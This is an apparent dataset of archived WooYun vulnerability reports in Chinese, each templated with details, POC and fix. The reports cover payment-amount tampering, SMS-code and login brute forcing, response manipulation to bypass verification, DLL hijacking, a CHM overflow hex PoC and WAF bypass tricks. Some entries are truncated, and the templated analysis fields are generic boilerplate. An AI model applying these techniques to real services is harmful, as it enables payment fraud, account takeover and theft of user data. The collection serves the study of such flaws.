**详情**: 在“普通渲染充值”页面，输入金额，借助开发人员工具修改“货币”的 Value 属性为其他货币（如“GBP”），并将“支付方式”中某电商平台的选项 style 属性中“display:none;”删除，可以达到利用汇率逻辑错误漏洞的目的。

**POC**: 某电商平台中显示“充值9元（CNY）”RenderBus 中显示“成功充值9GBP”

**绕过**: 直接利用

**修复**: 增加服务器端输入验证，实际入账金额以 某电商平台通知消息 为准。
---

---
### [wooyun-2014-065861] 昵图网呢币素材任意下载漏洞
**厂商**: 某图片网站 | **年份**: 2014 | **类型**: 内容安全

**元思考**: 触发信号: 功能测试

**洞察**: 内容安全防护不足，开发者信任前端输入

**测试流程**:
1. 识别内容安全相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 说明：业务逻辑没有分清，导致呢币类素材可以被共享分素材的下载地址下载到。详情看图片及代码步骤：1、新注册一个帐号，获取到COOKIE，现在昵图用的是SESSION，那么我们就获得SESSION_ID2、找到你想要下载的呢币类的素材地址，如：https://example.com/[已脱敏] 提交ID，即可获得该图的下载地址<?phpfunction get_downlink($nipicUrl){$match = array();preg_match('/^http:\/\/www.nipic.com\/show\/(\d+).html/' , $nipicUrl , $match);$downid = $match[1];$ip = "[IP已脱敏]

**POC**: 红框的就是下载地址了。

**绕过**: 直接利用

**修复**: 1、共享分下载的程序判断是否为原创呢币类，若不是请处理业务逻辑。2、呢币类下载地址请判断是否为共享分类，若不是请处理业务逻辑。PS:支持昵图网，昵图确实给我们带来了很大的便利，创造了价值，虽然图片版权这东西谁也说不清楚。希望没有给昵图带来很大的影响，只为友情检测，并无恶意！ 没有100%完善的系统，
---

---
### [wooyun-2015-0153546] 店小一商城多处设计逻辑缺陷漏洞打包
**厂商**: 店小一 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 漏洞描述“店小一”商城任意手机号码注册（可爆破短信验证码）+ 一分钱买手机0x02 漏洞地址https://example.com/[已脱敏] 任意手机号注册漏洞详细首先，点击注册这里随便输入一个手机号码13333333211然后其他随便，点击发送短信后这时候随便输入一个验证码，系统会即时核对验证码是否正确，这个过程是需要与后台交互然后抓包我经过真的手机验证码试过之后，发现是连续的号码，这里从210200开始然后开始爆破很快有结果，验证码是211986然后填入看看对不对OK，正确，可以成功注册了0x04 0.01元购买商品漏洞详细就买个iPhone吧，加购物车然后直接结算然后这个时候抓包改包将shipping_fee参数改成负数 这里填-5309.99(其实后来知道这是快递费)然后发送，截获包里显示为0.01元最终成果付个款。看看能不能成功呢？

**POC**: 结果必然是成功的啊最后，没看到发货方式是自提。。。好吧，那就算了吧。还想看看他们能不能发货来着。

**绕过**: 直接利用

**修复**: 这个，需要加强逻辑校验。
---

---
### [wooyun-2013-037423] 某IM软件MiTalk存在DLL劫持漏洞
**厂商**: 某手机厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时某IM软件的安装路径为：C:\Program Files\Xiaomi\MiTalk\打开MiTalk.exe时会加载三个处不存在的DLL文件，分别是：C:\Program Files\Xiaomi\MiTalk\mitalkchs.dllC:\Program Files\Xiaomi\MiTalk\mitalkcht.dllC:\Program Files\Xiaomi\MiTalk\mitalkloc.dll以上任一DLL文件与MiTalk.exe放在对应的目录，这样就可以在运行MiTalk.exe的时候会同时加载对应的DLL，这个DLL可以为自制的任意内容的dll。此方法可用于劫持运行某些程序（木马病毒）。（我这里放入特定的dll后，运行MiTalk.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 求红米F码！
---

---
### [wooyun-2013-022241] 某运营商wifi免费获取漏洞
**厂商**: 某运营商网上营业厅 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选择购买时长卡选一次性账号去结算验证手机支付类型选银行卡，会提示有没有接入网络选取消，再会有一个提示选确定

**POC**: 手机没连接上，短信截图没搞到，手机会收到1065902100826的两条短信，第一条短信内容死验证码，第二条你会发现帐号和密码就躺在你手机里了

**绕过**: 直接利用

**修复**: 不想亏钱的话，嘿嘿，你懂得
---

---
### [wooyun-2013-027278] 某支付钱包/快捷支付应用无需验证手势密码即可成功支付
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本人有一台安卓的平板电脑，安装了南京光辉互动网络科技有限公司开发的游戏：捕鱼之海底捞，在游戏中可以购买金币，点击购买后，直接调用某支付钱包的相关程序进行支付，之后出现某电商平台的确认支付界面，只有一个“确认付款”按钮，然后很容易就点击支付了，完全不需要校验帐号与密码。确认支付界面也不需要进行手势密码的输入，就可以显示出某电商平台余额和余额宝余额。试想，如果游戏开发商做得再隐蔽一些，直接使用程序模拟点击“确认付款”的按钮，那我们的余额就会一步步被扣掉。本人本来不会存放余额在某电商平台，最近推出了余额宝，投资基金的，所以转入一些金额在里面，但也元须进行转出或确认，直接将金额扣款了，感觉非常不保险。

**POC**: 点击购买直接调用某电商平台的相关程序进行支付直接显示相关余额信息，进行确认付款付款成功了

**绕过**: 直接利用

**修复**: 立即删除相关游戏、某支付钱包、快捷支付登录某电商平台，关闭“手机服务”中的无线支付功能
---

---
### [wooyun-2015-0128703] P2P金融安全之珠宝贷存在找回密码/关键凭证修改逻辑漏洞
**厂商**: zhubaodai.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在漏洞url：https://example.com/[已脱敏] 改为 “isOK”：true ，然后可以得到验证通过的页面改完手机号后在密码管理中查看是否成功2.修改密码处有同样漏洞再返回包中加入“isOK”：true ，可进入下一步

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 修改手机号码验证逻辑代码
---

---
### [wooyun-2015-0104429] 济南市人力资源和社会保障局验证码绕过可爆破用户账号密码
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆处验证码可被pkav大神器完美识别 -、-burp抓包丢进去就可以爆破哦 只需要生成个字典遍历下后6位就知道用户存不存在，账号为身份证号，默认密码为身份证号后6位，设置俩payload 用一个字典一起爆破 再用pkav大神器的验证码识别绕过验证码。。。 你懂得经验证，返回的包的长度为以下：账号不存在：11281密码正确：10907密码错误：11262可以根据返回的长度来判断爆破成功与否

**POC**: 用老妈的账号测试一下 可以被爆破出来仅用老妈账号确认漏洞存在，未翻看他人账号

**绕过**: 过滤绕过

**修复**: 我猜，验证码是不是再非人类一点嘞。起码要字母和数字一起出来吧。
---

---
### [wooyun-2014-048676] Windows XP处理CHM文件缓冲区溢出漏洞
**厂商**: Microsoft | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试环境：winxp sp3poc构造：将下列数据以16进制的形式保存在文件中。大小为：0ECH（236字节）命名为poc.CHM注意我构造的最后4个字节。就是34333231H49545346030000006000000000000000000000000000000010FD017CAA7BD0119E0C00A0C922E6EC11FD017CAA7BD0119E0C00A0C922E6EC0000000000000000000000000000000060000000000000008000000000000000E000000000000000495453500000000000000000000000002C00000000000000010000000000000000000000000000000000000000000000000000006A92025D2E21D01

**POC**: null

**绕过**: 直接利用

**修复**: 修改文件解析的相关代码！
---

---
### [wooyun-2012-05084] 某互联网公司2012beta导致chrome崩溃
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143128] 地下城堡iOS客户端伪造上传存档获取水晶（通信算法解密分析）
**厂商**: dxcb.leiting.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地下城堡为中国区iOS付费榜前十的游戏，其iOS版中存在一个上传存档的功能，会将用户目前的游戏数据处理后发往api.dxcb.cn.taojingame.com，这个功能存在逻辑漏洞，可以构造任意存档。首先通过抓包可以截获到上传存档的流量：通过反复的尝试上传不同的存档，可以确认data参数代表了存档数据，md5参数是对存档数据的签名，其他参数在短时间内不会改变。通过逆向程序发现存档数据的变换算法为：data = urlencode(base64encode(zlib.compress(game_data)))对data参数的值进行解码可以得到明文的存档数据：通过修改这些数据，可以构造任意的存档，其中也包含了钻石等付费资源的数据。存在漏洞的部分是之后的md5签名算法，开发商通过对data参数进行md5签名校验来防止用户篡改存档，但是此处的md5签名算法内嵌在程序代码中，保护强度不够，可以被逆

**POC**: (见原文)

**绕过**: 编码绕过

**修复**: 更换md5签名算法，不要将动态生成的secret发出。
---

---
### [wooyun-2015-093504] 房多多某处存在设计逻辑缺陷泄露15万条订单及大量敏感信息
**厂商**: fangdd.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 房多多某系统存在弱口令看了这个洞洞，试了试https://example.com/[已脱敏] 时，账户神奇的处于登陆成功状态了！分析一下原因：对比下登陆前后cookie信息虽然显示账户禁用，但是分配了一个FDDKEEPINGID，限时24分钟虽然页面没有自动跳转到账户界面，但是实际上的逻辑已经赋予了权限，只要手动输入正确的url即可成功进入账户界面。近千合作项目，泄露合作房地产商项目经理姓名电话近15万条订单信息，并可随意取消订单！点开具体订单，客户信息是没打码的。泄露快钱相关信息：交易参考号，缩略卡号4500条结算清单，可任意修改发票。中介费好高让我去收款可好？！

**POC**: 如上所示了

**绕过**: 直接利用

**修复**: 只是截图做危害演示，未修改任何数据，也未做任何越权操作。求礼物，求20rank
---

---
### [wooyun-2012-04010] 某安全浏览器设计缺陷-误报弹窗广告
**厂商**: 某安全厂商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如果用鼠标中键单击链接,将被某安全浏览器拦截为弹窗广告

**POC**: 当用中键点击打开一个链接时,360会认为是广告

**绕过**: 直接利用

**修复**: 修改下广告判定规则....
---

---
### [wooyun-2015-0100887] 某资讯APPAPK两处逻辑漏洞
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一处是注册任意未注册手机号码另一处是登录爆破这两处的关联在于一条信息：30分钟有效，登录后可以继续使用，有多少用户会在手机客户端修改密码？？这是一处设计缺陷先来注册一个靓号：18888888888注册的接口也可以用来探测该手机号码是否已经注册，如果已经注册，则返回1001，能够注册则返回success，这里可以得到已经注册手机号，然后爆破POST /user/mobile/send_code/ HTTP/1.1Accept-Encoding: gzipContent-Length: 241Content-Type: application/x-www-form-urlencodedHost: ic.snssdk.comConnection: Keep-AliveCookie: install_id=2628615753X-SS-Cookie: install_id=2628615753ty

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0109001] 万科某系统任意密码重置
**厂商**: 万科 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试不容易，求不查水表，不忽略，再给个合情合理的rank测试环境：住这儿app，ios客户端忘记密码流程中，第一步：https://example.com/[已脱敏]

**POC**: POST /uip/messagesend/smsSend.do HTTP/1.1Host: zhuzher.vanke.comAuthorization: Basic Og==Accept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-Hans;q=1, en;q=0.9, fr;q=0.8, de;q=0.7, ja;q=0.6, nl;q=0.5Content-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 468Connection:

**绕过**: 过滤绕过

**修复**: 服务端限制短信间隔，服务端定义校验码，
---

---
### [wooyun-2013-035461] 皮皮播放器DLL劫持漏洞（不限路径）
**厂商**: 皮皮网 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 皮皮播放器PIPIPlayer（版本3,3,2,0），安装程序为官网pipi_3318.exe，windows xp sp3环境，PIPIPlayer运行时会试图加载一个不带路径的nvcuvid.dll文件，如果在音视频文件目录下放置一个恶意的nvcuvid.dll文件，当用户双击打开该音视频文件时(测试时为.mp4文件)，恶意DLL即被加载触发，危害性不用说了吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 带全路径加载。
---

---
### [wooyun-2015-0148735] 网站安全狗网站特定资源保护绕过(windows+apache)
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发现网站安全狗还有个功能是资源保护，其中“网站特定资源保护”功能可以用来阻止用户或者攻击者访问其指定类型的文件，比如bak、mdb、mdf等等的文件。测试发现结合操作系统特性便可轻易地绕过这些保护措施。绕过方法：在url的文件名后增加空白符、点号(.)或者回车换行符。测试环境：网站安全狗（APACHE版）for Windows测试主程序版本：3.5.11730测试网马库版本：2015-10-08测试环境：vmware Windows xp sp3，apache+php+mysql集成环境测试过程：1）通过点号绕过。直接访问1.zip，被阻断：在1.zip后加一点号，绕过：2）通过空格绕过3）通过回车换行绕过

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强对文件名的处理。
---

---
### [wooyun-2015-094714] 出国去旅游网某处设计不合理(支付逻辑漏洞)
**厂商**: 出国去旅游 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 又是任意金额购买，如果订单金额后台会审核的话，可能就不会消费了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2016-0188448] uc浏览器改版本后处理不恰当导致跨域脚本漏洞
**厂商**: UC Mobile | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 和前辈的漏洞http://**.**.**.**/bugs/wooyun-2010-0125244对比了下错误页面发现新版把URL后错误的字符全删了可是ip却被解析为#导致前辈说的可以把poc解码导致漏洞产生图如下直接用前辈的poc即可访问https://example.com/[已脱敏] it!

**POC**: 测试版本为最新版安卓

**绕过**: 直接利用

**修复**: 不要解码
---

---
### [wooyun-2013-039258] 360主动防御病毒启动存在绕过
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 写个bat和一个reg通过bat文件将reg文件导入导致劫持用户下次打开某个软件（例如某互联网公司）的时候被替换 顺利执行恶意软件过了360主动防御

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 给点rank
---

---
### [wooyun-2015-0113649] 美囤妈妈存在支付漏洞
**厂商**: 美囤妈妈 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 然后支付抓包我把这里修改了 21850  看着修改看是不是变得更低了， 我有一件商品付款成功

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-04112] 我用5块钱买了10000颗云豆
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 购买云豆支付漏洞

**元思考**: 触发信号: 功能测试

**洞察**: 购买云豆支付漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别购买云豆支付漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以刷新云豆,操作很简单

**POC**: 看图吧在提交之前用工具拦截，比如fiddler，拦截到的数据把100修改成5看下图:需要支付100元，但实际“本次消费合计5元”接下来的过程看图:

**绕过**: 直接利用

**修复**: 程序员懂的。其他支付业务没看，请自检。
---

---
### [wooyun-2015-0162546] 乐友育婴网设计逻辑缺陷可获取所有用户注册邮箱帐号
**厂商**: 乐友 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可获得所有的邮箱，操作较为简单，主要就是希望rank多一点

**POC**: 这就是我们的目标网站，红箭头处，就是我们今天存在漏洞的功能，不说了，载入我们如图所示，随便填一个账号:libin好了，载入了，可以看见图上的账号注册邮箱是打码的，怎么办呢?这时候我们的burp神器已经开启了，所以现在点击发送好了，在返回的数据包里，我们可以清楚的看见：该用户的邮箱地址,同理，通过这样的方法我们可以获取到所有用户的邮箱帐号，应该可以充实一下社工库什么的好了，为了增加说服力我再附图一张:方便验证:https://example.com/[已脱敏] 忘记密码处

**绕过**: 直接利用

**修复**: 专业的人是你们
---

---
### [wooyun-2015-0135916] 飞芃贸易某处逻辑缺陷可爆破
**厂商**: 上海飞芃贸易有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：http://**.**.**.**/登录没有验证码校验，可爆破，爆破之后查看订单，并且通过遍历订单id可获取海量数据. 可得到其他用户的购买详情！首先暴力破解密码：hongtao ...error 0 ，可以登录然后查看信息：查看订单，为了保护信息安全，就做了下处理更改下id,看下是否可以访问其他人的购买信息：

**POC**: 查看其他人的信息，有手机号码，住址

**绕过**: 直接利用

**修复**: 你们比我更懂。。。
---

---
### [wooyun-2014-056990] Dedecms全版本后台验证码逻辑漏洞可导致暴力破解
**厂商**: Dedecms | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: //登录检测$admindirs = explode('/',str_replace("\\",'/',dirname(__FILE__)));$admindir = $admindirs[count($admindirs)-1];if($dopost=='login'){$validate = empty($validate) ? '' : strtolower(trim($validate));$svali = strtolower(GetCkVdValue());if(($validate=='' || $validate != $svali) && preg_match("/6/",$safe_gdopen)){ResetVdValue();ShowMsg('验证码不正确!','login.php',0,1000);exit;} else {$cuserLogin = new us

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在用户名或者密码不正确的时候 都执行 ResetVdValue(); 此函数
---

---
### [wooyun-2014-049813] 17WO手机验证码绕过可任意修改其他用户密码
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 17WO，手机验证码绕过，任意号码注册，任意号码修改密码，业务随便订购。

**POC**: 17WO，手机验证码绕过，任意号码注册，任意号码修改密码，业务随便订购。wap站为了“方便”验证，竟然在本地返回了验证码，那我们就看看吧。图片说明，不打字说明了。随便注册个号，号码随便输入，找回密码一样操作。在本地查看验证码通过验证，填写资料，订购业务，由于号码是非广东号码，不能订购业务。

**绕过**: 过滤绕过

**修复**: 我只是想去看看刷流量的怎么刷的，这个，你们自己懂的办。
---

---
### [wooyun-2013-045249] 浙江电信果粉部落网站逻辑漏洞无限刷省内流量
**厂商**: 浙江电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙江电信果粉部落网站逻辑漏洞 首次登陆可以送300M流量，但是因为逻辑漏洞，可以无限次刷流量。可通过无限次调用 g.10006.co/lq 无限次刷流量。此漏洞在12月5日前有效，目前可能已修复。另外，浙江电信所有活动网站*.zj189.cn均存在通过修改COOKIE可以伪造用户身份登陆的问题。登陆后可以查看用户个人信息，办理流量包等业务；P.S 这里还有一个完全不需要验证的读取用户真实姓名和套餐名的接口：---------------------------POST /errnav/getAData HTTP/1.1Host: s.zj189.cnConnection: keep-aliveContent-Length: 26Cache-Control: max-age=0Accept: */*Origin: https://example.com/[已脱敏] XMLH

**POC**: 刷流量的漏洞目前可能已经被修复，否则我也不会公开。以下是刷成功的截图：另外的几个漏洞目前均有效，大家可以测试。

**绕过**: 直接利用

**修复**: 检查后台逻辑。
---

---
### [wooyun-2015-0134686] 西秦好购随便买东西（看电影、吃海鲜、旅游、想怎样就怎样）
**厂商**: 西秦好购 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天下午有朋友推荐我下载西秦好购买东西、因为西秦好购的东西比某外卖平台糯米便宜。然后我就用我的2G网速下载了APP（买不起3G 4G手机。。。）到晚上十点、终于下载好了。打开一看、里面的东西还真的要便宜几块钱。作为一个吃货、第一反应肯定就是要逛美食栏目.发现排在第一的就是一直都想去吃的锦江大酒店海鲜自助餐，果断点进去买一份！好贵，，吃不起咋办？所以重点就来了，重点就来了，重点就来了：1、点击购买2、选择好购金币支付（随便选择使用多少），下面的选择某电商平台某互联网公司都行3、打开抓包神器开始抓包，然后点击确认支付4、进入付款界面时不付款、反回。5、去看看自己的累计积分吧原理应该是负负得正、逻辑错误。

**POC**: 用积分购买：然后就买成功了：

**绕过**: 直接利用

**修复**: 做限制
---

---
### [wooyun-2014-083092] 74cms v3.5.1 后台验证码绕过（可爆破）
**厂商**: 74c,s.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 验证码设计缺陷导致后台可爆破登陆

**POC**: 后台登陆抓包，设定字段，验证码可重复使用：进入后台：

**绕过**: 直接利用

**修复**: 验证码有效性
---

---
### [wooyun-2014-076466] 大雅公司某文档服务应用存在支付漏洞（一分钱享用服务）
**厂商**: 大雅公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经常有学生来问我们论文相似度检测的事情，我们没有买这个系统啊，有同学告诉我超星有一个大雅相似度检测，可以免费检测相似的比例，但是查看具体的相似段落的时候，需要付费了用fiddle截包，修改一下fee字段的值为0.01（不能修改为0，某电商平台那边有验证）https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加上金额的校验
---

---
### [wooyun-2015-0145131] 德阳移动旗下商城存在支付逻辑漏洞可0元买手机
**厂商**: 德阳移动商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 废话不多说直接看下面 ↓

**POC**: https://example.com/[已脱敏]  有运费的购买 别问我为什么要选择有运费的，然后直接发包就行了 由于限购一个号买一个就没办法继续了上次购买成功的记录

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2016-0194751] 大疆某处支付逻辑漏洞可1元买无人机
**厂商**: dji.com | **年份**: 2016 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册一个大疆的账号，打开大疆的商城，挑选一件商品进入点击购买https://example.com/[已脱敏] 点击提交订单然后选择支付银行。开始拦截https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 取消store域的http访问检查付款逻辑。并且check实际金额因为提交乌云失败了，所以重拍了一份@@ 会发货吗？
---

---
### [wooyun-2013-047426] RADASM缓冲区溢出漏洞(第三弹）
**厂商**: www.oby.ro | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原理：在处理.MNU文件时未对结构大小进行检测，造成缓冲区溢出。这里我随意构造触发程序崩溃的poc 把下面数据以文本形式保存，命名为poc.mnu（80H个1  4个2）1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111112222相应代码：004245CD   .  8DBD BCFEFFFF lea     edi, dword ptr [ebp-144]004245D3   .  8B4E 68       mov     ecx, dword ptr [esi+68]          ;  ecx被淹没 可控004245D6   .  0BC9   

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检测大小
---

---
### [wooyun-2015-0165894] 北京儿童医院集团有限公司某系统存在设计逻辑缺陷
**厂商**: 北京儿童医院集团有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: burpsuite爆破来一发海博投资协同办公系统：http://**.**.**.**/

**POC**: burpsuite 爆破开始抓包：POST /OAapp/WebObjects/OAapp.woa/wo/com.oa8000.mainapp.Main/4C52PFqzdOQ9xOR3E3OIBw/0.11 HTTP/1.1Host: **.**.**.**Content-Length: 180Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Re

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2012-07738] 新蛋中国支付漏洞
**厂商**: newegg（新蛋网） | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

